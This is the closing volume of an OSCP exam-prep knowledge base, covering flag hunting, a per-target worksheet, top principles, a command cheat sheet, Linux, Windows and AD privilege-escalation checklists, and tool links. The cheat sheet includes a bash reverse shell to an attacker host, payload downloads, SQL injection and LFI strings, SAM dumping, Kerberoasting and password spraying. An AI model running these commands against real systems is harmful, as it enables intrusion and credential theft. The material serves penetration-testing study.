ls -la /root/ /home/*/ 2>/dev/null                             # the two usual spots
cat /root/*.txt /home/*/*.txt 2>/dev/null                      # dump them
# by FILENAME anywhere:
find / \( -iname 'proof.txt' -o -iname 'local.txt' -o -iname 'flag*.txt' -o -iname 'root.txt' -o -iname 'user.txt' \) -not -path '/proc/*' 2>/dev/null
# by CONTENT (flag marker), excluding noise dirs:
grep -rliE 'flag\{|OS\{' --exclude-dir={proc,sys,run,dev,.cache} /root /home /var /opt /tmp /etc 2>/dev/null
```
**If nothing:** you may not have the right privileges yet (a root-only flag needs privesc first), or you're on the wrong host — `whoami`/`id`, then check the *other* users' homes/desktops (as admin/root you can read them all).

# [MACHINE-JOURNAL] reusable worksheet (copy per target)
```
TARGET: __________  IP: __________  HOSTNAME: __________  OS: __________
DATE: ____  START: ____  (AD set? Y/N)  PROVIDED CREDS: __________

OPEN PORTS (from all-tcp + scv):
 PORT  SERVICE  VERSION  ENUM DONE?  FINDINGS
 ____  _______  _______  ________    ________________

WEB:  URLs ____  VHOSTS ____  DIRS ____  PARAMS ____  TECH/VERSION ____  LOGIN/UPLOAD? ____

CREDENTIALS (source → user:pass/hash → tried where → works?):
 - ______________________________________________

INITIAL ACCESS HYPOTHESES (claim / test / timebox):
 H1: ______  test: ______  result: ______  next: ______
 H2: ______  test: ______  result: ______  next: ______

FOOTHOLD: user ____ via ____ (screenshot: local.txt + id/whoami + ip ✔)

LOCAL ENUM: sudo -l / whoami-priv ____  SUID/services ____  creds looted ____  internal subnets ____

PRIVESC: vector ____  → root/SYSTEM (screenshot: proof.txt + whoami + ip ✔)

LATERAL / PIVOT: creds reused on ____  tunnel ____  new hosts ____

AD: BloodHound path ____  roasts ____  ACL edges ____  DCSync ✔?

PROOF CAPTURED: [ ] local.txt  [ ] proof.txt  [ ] AD each host  [ ] flags entered in panel

WHAT I MISSED (post-mortem): ____________________
LESSON LEARNED: ____________________
```

---

# FINAL DELIVERABLES

## A. [MASTER-INDEX] → see Volume 0 (full tag list + volume map).

## B. [TOP-100-THINGS] (condensed to the highest-value ~50 principles; expand via tags)
1 Enumerate all ports+web before exploiting. 2 AD = 40 pts, do it first/most. 3 No bonus points — need clean 70. 4 Metasploit one target only. 5 Spray every cred everywhere. 6 Cheapest test first. 7 Screenshot proof immediately (flag+id+ip). 8 Notes continuously, one file/target. 9 Re-enumerate after every privilege change. 10 Read tool output literally. 11 `-p-` always. 12 Quick UDP top-100. 13 Manual > MSF for muscle memory. 14 Password reuse beats exploits. 15 Stabilize shells before working. 16 Kerberoast + AS-REP every AD. 17 BloodHound early, mark Owned. 18 Verify scanners manually (false positives). 19 One box's loot unlocks others. 20 Rotate targets to break tunnel vision. 21 Understand exploits before running. 22 Save all artifacts. 23 `sudo -l`/`whoami /priv` first on any shell. 24 Loot configs/history/backups/git/DB. 25 Reverts are free. 26 Report is graded — repro steps required. 27 No one-click AD auto-pwn on exam. 28 Eat/sleep/break. 29 Fix Kerberos clock skew. 30 LFI value is often file-read not RCE. 31 SUID/sudo → GTFOBins. 32 SeImpersonate → Potato → SYSTEM. 33 Unquoted path needs a writable segment. 34 NTLM hash → PtH before cracking. 35 MSSQL → xp_cmdshell; Postgres → COPY PROGRAM; MySQL → FILE. 36 Add hostnames to /etc/hosts. 37 vhost fuzz with `-fs` baseline. 38 SNMP/UDP hides creds in process args. 39 SMB null/guest → shares/users. 40 WriteDACL/WriteOwner/GenericAll → own the object. 41 DCSync = game over. 42 Ligolo > proxychains where possible; `-sT` over SOCKS. 43 15-min re-read / 30-min switch. 44 If it needs a 0-day, you missed enum. 45 Timebox every hypothesis. 46 Try anonymous/default first. 47 Common egress ports 443/80/8080 for shells. 48 LHOST = tun0, not eth0. 49 Kernel exploits last. 50 Enter flags in the panel AND show in report.

## C. [TOP-100-COMMANDS] (the ones you actually type)
```
# ENUM
nmap -p- --min-rate 2000 -Pn -oN all.txt $IP
nmap -p<ports> -sCV -Pn -oN scv.txt $IP
nmap -sU --top-ports 100 -Pn $IP
whatweb http://$IP ; curl -sI http://$IP
feroxbuster -u http://$IP -x php,txt,html
ffuf -u http://$IP/FUZZ -w dirlist.txt
ffuf -u http://$IP -H "Host: FUZZ.$D" -w subs.txt -fs N
nxc smb $IP ; nxc smb $IP -u '' -p '' --shares
enum4linux-ng -A $IP ; smbclient -N -L //$IP/
snmpwalk -v2c -c public $IP ; snmp-check $IP
dig axfr @$IP $D ; showmount -e $IP
ldapsearch -x -H ldap://$IP -b "dc=..,dc=.."
rpcclient -U '' -N $IP   (enumdomusers)
# WEB/SQLI
sqlmap -r req.txt --batch --dbs
' UNION SELECT 1,2,3-- -   ;   ' OR 1=1-- -
?page=../../../../etc/passwd ; php://filter/convert.base64-encode/resource=index.php
# SHELLS/TRANSFER
nc -lvnp 443
bash -i >& /dev/tcp/$LHOST/443 0>&1
python3 -c 'import pty;pty.spawn("/bin/bash")' ; stty raw -echo; fg
python3 -m http.server 80 ; impacket-smbserver share . -smb2support
wget http://$LHOST/f -O /tmp/f ; certutil -urlcache -split -f http://$LHOST/f f
# LINUX PRIVESC
id; sudo -l; find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null
cat /etc/crontab; ./linpeas.sh
# WINDOWS PRIVESC
whoami /all; whoami /priv; systeminfo; cmdkey /list
.\winPEASx64.exe ; PrintSpoofer64.exe -i -c cmd
reg save HKLM\SAM sam & reg save HKLM\SYSTEM sys
# CREDS/HASH
secretsdump.py $D/$U:$P@$IP ; nxc smb $IP -u $U -H $H
hashcat -m 1000 h rockyou.txt ; hashcat -m 13100 tgs rockyou.txt -r best64.rule
# AD
bloodhound-python -u $U -p $P -d $D -ns $DC -c all --zip
impacket-GetUserSPNs -request $D/$U:$P -dc-ip $DC
impacket-GetNPUsers $D/ -no-pass -usersfile users -dc-ip $DC
nxc smb <subnet> -u $U -p $P --continue-on-success
evil-winrm -i $IP -u $U -p $P ; impacket-psexec $D/$U:$P@$IP
net rpc password target newpass -U "$D/$U%$P" -S $DC
# PIVOT
./proxy -selfcert ; ./agent -connect $LHOST:11601 -ignore-cert
ssh -D 1080 user@pivot ; proxychains nxc smb 172.16.5.0/24
./chisel server -p 8000 --reverse ; ./chisel client $LHOST:8000 R:socks
```

## D. [TOP-50-ENUM-CHECKS]
Full `-p-` TCP; `-sCV` on open; top-100 UDP; every web port fully; whatweb+headers+source+robots+JS; dir brute (recursive)+extensions; vhost fuzz; param discovery; SMB null/guest shares+users+rid-brute; enum4linux-ng; read every readable share; SNMP `public` walk; DNS zone transfer + SRV; LDAP anon bind + descriptions; rpcclient users; NFS showmount+mount; FTP anon+upload; SMTP user enum; MSSQL/MySQL/Postgres default creds; Redis/Mongo unauth; searchsploit every version; check `/.git`,`.env`,backups; TLS cert SAN for vhosts; add hostnames to `/etc/hosts`; re-scan after new access; identify OS via TTL/nmap; note internal subnets; check default creds on every login; look for upload/exec features; test one injection char per param; capture Responder if on-subnet; check WinRM/RDP reachability with creds; kerberoast+asrep every AD; BloodHound collect; password policy before spray; spray each cred all services; check process lists (pspy/ps); check `sudo -l`/`whoami /priv`; look for creds in configs/history; check cron/scheduled tasks; enumerate installed software versions; check writable dirs/files; check capabilities; verify each scanner finding manually.

## E. [TOP-50-LINUX-PRIVESC-CHECKS]
`id`; `sudo -l`; SUID `find -perm -4000`; SGID `-2000`; capabilities `getcap -r /`; `/etc/crontab`+cron.d/daily; pspy for hidden crons; writable scripts run by root; wildcard-injection dirs; PATH-hijackable SUID (strings/ltrace); systemd writable units/timers; writable `/etc/passwd`/`shadow`/`sudoers(.d)`; NFS `no_root_squash`; docker/lxd group; docker socket; container caps/mounts; `~/.ssh` keys (reuse); `~/.bash_history`+`.*_history`; config creds (`/var/www`,`.env`,DB); `.kdbx`/keepass; backups; mounted fstab creds; root processes (`ps aux`); LD_PRELOAD/LD_LIBRARY in sudo env_keep; sudo version CVEs (3156/14287); pkexec PwnKit; kernel `uname`+les2 (last); MySQL blank root; internal services (`ss -tlnp`); cron on `/etc/cron.d`; setuid perl/python caps; writable `/opt`/`/usr/local/bin`; group memberships (`id`); readable `/root` via cap_dac; SUID nmap/vim/find (GTFOBins); `authorized_keys` writable; `.netrc`/git creds; snmp on localhost; env creds; tmp race scripts; message-of-the-day writable; log-writable for injection; python library hijack; sudo edit of tar/zip; abusing `screen`/`tmux` sockets; check `getcap` on python.

## F. [TOP-50-WINDOWS-PRIVESC-CHECKS]
`whoami /all`+`/priv`; SeImpersonate→Potato; SeAssignPrimaryToken→Potato; SeBackup/Restore→SAM/NTDS; SeTakeOwnership; SeDebug→LSASS; SeLoadDriver; unquoted service paths (writable segment); weak service binary perms; service DACL `sc config`; DLL hijack/search order; AlwaysInstallElevated (HKLM+HKCU); writable Run/autorun keys; autologon `Winlogon` DefaultPassword; `cmdkey /list`+runas savecred; saved creds/DPAPI; PowerShell history file; unattend/sysprep xml; GPP cpassword; `web.config`/connection strings; KeePass; browser creds; scheduled tasks weak binary; startup folder writable; writable PATH dir before system32; installed vuln software (`wmic product`); app-pool identity (SeImpersonate); token impersonation (incognito); UAC bypass (if medium-IL admin); named-pipe impersonation; `runas /netonly`; hardcoded creds in scripts/registry; `reg query` for passwords; accessible SAM/SYSTEM backups; writable service registry key; `wsl`/docker on Windows; MSSQL service acct→SYSTEM; weak folder perms in `C:\`; `Program Files` writable; missing patches (`systeminfo`→wesng, last); credential manager vault; Wi-Fi profiles; `net user`/local admins; scheduled task run-as; COM hijack; printnightmare (context); check `whoami /groups` integrity level.

## G. [TOP-50-AD-CHECKS]
Fix clock skew; `nxc smb $DC` domain/host; validate provided cred; BloodHound `-c all` early; mark Owned nodes; Kerberoast `GetUserSPNs -request`; AS-REP `GetNPUsers`; crack roasts (13100/18200); spray each cred all hosts (`--continue-on-success`); password policy/lockout first; RID brute users; LDAP anon bind + `description`; `ldapdomaindump`; read SYSVOL/NETLOGON scripts; GPP cpassword; find SPNs; delegation flags (unconstrained/constrained/RBCD); ACL edges (GenericAll/Write/DACL/Owner/AddMember/AddKeyCredentialLink); ForceChangePassword; shadow credentials (certipy/pywhisker); targeted Kerberoast; DCSync rights; `secretsdump` a host you own (SAM/LSA); LSASS on owned host; reuse local admin hash across hosts (PtH); find where cred is local admin (Pwn3d!); psexec/wmiexec/evil-winrm/rdp; ADCS vuln templates (certipy find, ESC1/8); LAPS readable; gMSA readable; trust relationships; `ExtraSids`/SID history; Golden/Silver ticket (post-krbtgt); Pass-the-Ticket (getTGT/KRB5CCNAME); `-k` FQDN issues; MSSQL links to other hosts; coerce auth (printerbug) to relay/unconstrained; check `ms-DS-MachineAccountQuota` (add computer for RBCD); readable `description`/notes for creds; group memberships up to DA; find DA-session hosts; DNS SRV for DCs; SMB signing off host for relay; kerberoast without pre-auth (AS-REP as entry); re-run BloodHound "from owned" after each new principal.

## H. [TOP-50-TROUBLESHOOTING-CHECKS]
LHOST=tun0; listener up; egress port (443/80/8080); URL-encode web payloads; base64 commands; try sh/python/nc; AV on PS (`-ep bypass`/nc.exe); tcpdump to see SYN; `curl -v` replicate browser; add `Host:`/cookie/UA; `-L -k`; py2 vs py3; match exploit version/arch; install deps; change hardcoded IP; SMB `-d DOMAIN`/`--local-auth`; SMBv1 `NT1`; PtH `-H`; Kerberos skew `ntpdate`; FQDN+`/etc/hosts` for SPN; WinRM rights vs SMB; TLS 5986 `-S`; TTY full upgrade; `stty rows/cols`; certutil→curl.exe/bitsadmin/SMB; binary transfer mode; hashcat mode/format; strip username; rules+bigger list; chisel port/arch/`--reverse`; proxychains `socks5 127.0.0.1 1080`+`-sT`; ligolo route+session; DNS→/etc/hosts; vhost `-fs` baseline; nmap `-Pn`+lower rate; kernel exploit build match; revert crashed box; re-enumerate when stuck; verify tunnel with a known-open port; check password expired/reset; check lockout before spray; confirm you're on the right subnet; confirm proof screenshot has all 3 elements.

## I. [TOP-50-FOUND-SCENARIOS] → all covered above under `[FOUND-*]`
creds, ssh key, SUID, sudo, SMB, writable service, pw in config, git, backup, SQLi, LFI, RFI, cmd injection, SSRF, SSTI, XXE, upload, deserialize, IDOR, JWT, domain user, SPN, AS-REP user, hash, NTLM hash, Linux shell, Windows shell, WinRM, RDP, LDAP anon, SNMP public, NFS export, MSSQL creds, MySQL/Postgres/Redis/Mongo, Kerberos port 88, BloodHound GenericAll/WriteDACL/WriteOwner/AddKeyCredentialLink/DCSync, delegation, pivot host, dual-homed subnet, cracked service account, readable share, unattend.xml, GPP cpassword, phpinfo, exposed .env, default creds page.

## J. [FINAL-DAY-QUICK-REFERENCE]  (print this)
```
SET UP: folder per target (scans/loot/exploits/www/notes.md). VPN up. LHOST=tun0. Screenshot tool ready. Note template open.
KICK OFF: nmap -p- --min-rate 2000 -Pn on ALL targets in parallel. Read briefs.
PRIORITY: AD set FIRST (fresh brain). Standalones after. Rotate on 30-min rule.
EACH TARGET: -sCV open ports → per-service enum → creds → foothold → stabilize → local enum → privesc → PROOF SCREENSHOT NOW.
EVERY CRED: spray all services/hosts/users + variations.
AD: skew fix → BloodHound → Kerberoast+AS-REP → spray → ACL path → DCSync → PtH DC.
STUCK 30 min: [STUCK-PROTOCOL] → re-enum → switch target.
PROOF = flag + whoami/id + ip/ipconfig in ONE shot. Enter flag in panel.
LAST 3 HRS: stop hacking, verify all proofs + screenshots + notes complete.
METASPLOIT: one target only. Manual everything else.
BREAKS: eat, hydrate, sleep 4-6h. Fatigue = tunnel vision.
```

## K. [MINIMUM-VIABLE-PREP-PLAN] → Volume 0 Part 31 (study deep: AD, enum, privesc, web core, pivoting; practice ~40–60 boxes AD-weighted; skim BOF/exotic).

## L. [7-DAY-PLAN] → Volume 0 Part 32.

## M. [CURRENT-OFFSEC-RULES] → Volume 0 (23h45m+24h, 100/70, 40 AD + 3×20, no bonus, MSF one target, proof = flag+whoami+ip, report required, OSCP+ 3-yr).

## [RESOURCES]  🔗 external tools & references (bookmark — and cache OFFLINE)
> On the OSCP exam you **may** use public internet references (docs, GTFOBins, public exploits) — you may **not** use AI chatbots (`[EXAM-RULES-2026]`). Still, **save offline copies** of the starred ★ ones in case of connectivity issues on the day.

### Exploit / CVE research
- [Exploit-DB (EDB)](https://www.exploit-db.com/) — OffSec's public exploit archive; mirrored locally by `searchsploit`.
- [Google Hacking DB (GHDB)](https://www.exploit-db.com/google-hacking-database) — dork reference.
- [NVD (NIST CVE database)](https://nvd.nist.gov/) · [CVEDetails](https://www.cvedetails.com/) — look up a version's CVEs.
- [PacketStorm](https://packetstormsecurity.com/) — additional exploit archive.

### Privilege escalation / binary abuse ★
- ★ [GTFOBins](https://gtfobins.github.io/) — Linux SUID/sudo/capability escapes (the KB defers here 25×).
- ★ [LOLBAS](https://lolbas-project.github.io/) — Windows living-off-the-land binaries.
- [WADComs](https://wadcoms.github.io/) — Windows/AD offensive command lookup.

### Visual mind maps (attack-path flowcharts — glance to find your next move)
- ★ [Orange Cyberdefense mind maps](https://orange-cyberdefense.github.io/ocd-mindmaps/) — the famous **Active Directory** attack mind map (and pentest/web ones). Print/cache it — a visual companion to `[AD-ATTACK-PATH]`.
- [PayloadsAllTheThings AD README](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources) — text methodology maps.

### Web / general technique ★
- ★ [HackTricks](https://book.hacktricks.xyz/) — the big per-service/technique reference.
- ★ [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — payloads for every web vuln.
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) — methodology.

### Shells / hashes / wordlists ★
- ★ [revshells.com](https://www.revshells.com/) — reverse-shell generator (fill IP+port).
- [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) — identify the right `-m` mode. · [hashcat](https://hashcat.net/hashcat/)
- [SecLists](https://github.com/danielmiessler/SecLists) — wordlists (ships with Kali under `/usr/share/seclists`).

### Core tool repos (download binaries from "Releases")
- [PEASS-ng (linpeas/winpeas)](https://github.com/peass-ng/PEASS-ng) · [pspy](https://github.com/DominicBreuker/pspy)
- [Impacket](https://github.com/fortra/impacket) · [NetExec](https://github.com/Pennyw0rth/NetExec) · [BloodHound](https://github.com/SpecterOps/BloodHound) · [BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) · [chisel](https://github.com/jpillora/chisel)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) · [GodPotato](https://github.com/BeichenDream/GodPotato) · [mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus) · [PowerSploit (PowerView/PowerUp)](https://github.com/PowerShellMafia/PowerSploit) · [Certipy](https://github.com/ly4k/Certipy)

### Exam-safe enumeration automation (allowed — no auto-exploitation)
- [AutoRecon](https://github.com/Tib3rius/AutoRecon) — multi-threaded auto-enum; built to comply with OSCP rules.
- [nmapAutomator](https://github.com/21y4d/nmapAutomator) — staged nmap + service enum wrapper.
- See `[EXAM-SCRIPTS]` for your own copy-paste helper (`oscp.sh`).

### Practice (do boxes here)
- [OffSec Proving Grounds](https://www.offsec.com/labs/) — closest to exam ("PG Practice").
- [Hack The Box](https://www.hackthebox.com/) — use **TJ_Null's OSCP-like list** (search "TJ Null OSCP-like NetSecFocus") + IppSec videos.
- [OffSec exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) — **re-read before your sitting** (rules can change).

### [RESOURCES-MORE]  every other named tool (so nothing is unlinked)
**Windows privesc — potatoes & enum:**
[RunasCs](https://github.com/antonioCoco/RunasCs) · [RoguePotato](https://github.com/antonioCoco/RoguePotato) · [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) · [SweetPotato](https://github.com/CCob/SweetPotato) · [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) · [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) · [FullPowers](https://github.com/itm4n/FullPowers) · [PrivescCheck](https://github.com/itm4n/PrivescCheck) · [Seatbelt](https://github.com/GhostPack/Seatbelt) · [JAWS](https://github.com/411Hall/JAWS) · [Watson](https://github.com/rasta-mouse/Watson) · [wesng](https://github.com/bitsadmin/wesng) · [UACME](https://github.com/hfiref0x/UACME)

**Linux privesc enum:**
[LinEnum](https://github.com/rebootuser/LinEnum) · [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) · [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

**Shells / transfer:**
[Powercat](https://github.com/besimorhino/powercat) · [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) · [evil-winrm](https://github.com/Hackplayers/evil-winrm)

**AD — Kerberos / ACL / certs:**
[kerbrute](https://github.com/ropnop/kerbrute) · [bloodyAD](https://github.com/CravateRouge/bloodyAD) · [pywhisker](https://github.com/ShutdownRepo/pywhisker) · [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) · [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) · [Certify](https://github.com/GhostPack/Certify) · [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) · [gMSADumper](https://github.com/micahvandeusen/gMSADumper) · [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) · [windapsearch](https://github.com/ropnop/windapsearch) · [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

**AD — cred dumping / coercion / relay:**
[LaZagne](https://github.com/AlessandroZ/LaZagne) · [pypykatz](https://github.com/skelsec/pypykatz) · [lsassy](https://github.com/Hackndo/lsassy) · [mitm6](https://github.com/dirkjanm/mitm6) · [Inveigh](https://github.com/Kevin-Robertson/Inveigh) · [PetitPotam](https://github.com/topotam/PetitPotam) · [Coercer](https://github.com/p0dalirius/Coercer) · [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)

**Web / git:**
[PHPGGC](https://github.com/ambionics/phpggc) · [GitTools](https://github.com/internetwache/GitTools) · [git-dumper](https://github.com/arthaud/git-dumper)

> **Kali built-ins don't need download links** — nmap, ffuf/feroxbuster/gobuster, nikto, hydra/medusa, john/hashcat, sqlmap, smbclient/smbmap, enum4linux, rpcclient, ldapsearch, snmpwalk, responder, proxychains, sshuttle, masscan, cewl, crunch, dnsrecon, wpscan, etc. all ship with Kali (`apt`); see `[KALI-SETUP]`/`[KALI-TOOLBOX]`.

> ⚠️ Links/repos move over time — if one 404s, search the project name. Always confirm tool **flag syntax** against the version installed on your Kali.

## N. [SOURCES]
- [OSCP+ Exam Guide – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) — official exam structure, proof, tool rules.
- [OSCP+ Exam FAQ – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ) — Metasploit/tool clarifications.
- [Changes to the OSCP – OffSec](https://help.offsec.com/hc/en-us/articles/29840452210580-Changes-to-the-OSCP) — OSCP vs OSCP+, bonus removal.
- [Everything you need to know about the OSCP+ – OffSec Blog](https://www.offsec.com/blog/everything-you-need-to-know-about-the-oscp-plus/) — official OSCP+ overview.
- [Renewing OffSec Certification – OffSec](https://help.offsec.com/hc/en-us/articles/36010548001812-Renewing-OffSec-Certification-by-Taking-a-Qualifying-Certification-Exam) — 3-year renewal paths.
- [OSCP Exam Guide (2026) – StationX](https://www.stationx.net/oscp-exam-guide/) — [COMMUNITY] structure summary.
- [OSCP+ 2026 Update – Macksofy](https://www.macksofytrainings.com/oscp-plus-2026-update-new-exam-structure-ad-sets/) — [COMMUNITY] AD-set emphasis.
- **Tool/technique references** [GENERAL], verify syntax on official docs: GTFOBins, HackTricks, PayloadsAllTheThings, Impacket/NetExec/BloodHound/Ligolo-ng/Chisel/hashcat docs, TJ Null's OSCP-like list. *(This KB synthesizes these — always confirm exact flags against the current tool version.)*

---
*End Volume 6. Full KB = VOL-0 … VOL-6. Merge: `cat VOL-*.md > OSCP-KB-COMPLETE.md`.*
